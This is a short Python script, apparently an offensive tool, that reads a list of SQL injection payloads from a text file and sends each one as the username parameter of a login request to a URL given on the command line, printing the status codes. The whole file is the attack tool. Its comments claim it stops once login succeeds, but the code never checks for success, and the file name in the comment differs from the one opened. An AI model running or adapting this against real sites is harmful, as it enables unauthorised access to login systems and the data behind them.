#Create payloads.txt with list of sqli payloads
import requests
import sys

#read the payloads from the text file
with open('payload.txt', 'r') as f:
    payloads = f.readlines()

#get the URL from the command line argument
url = sys.argv[1]


#try each payload until login is successful
for payload in payloads:
    # send the request with the payload as a parameter
    r = requests.get(url, params={'username': payload, 'password': '12345678'})
    print("URL:"+str(url)+"  Payload: "+str(payload)+"  Status Code:"+str(r.status_code))
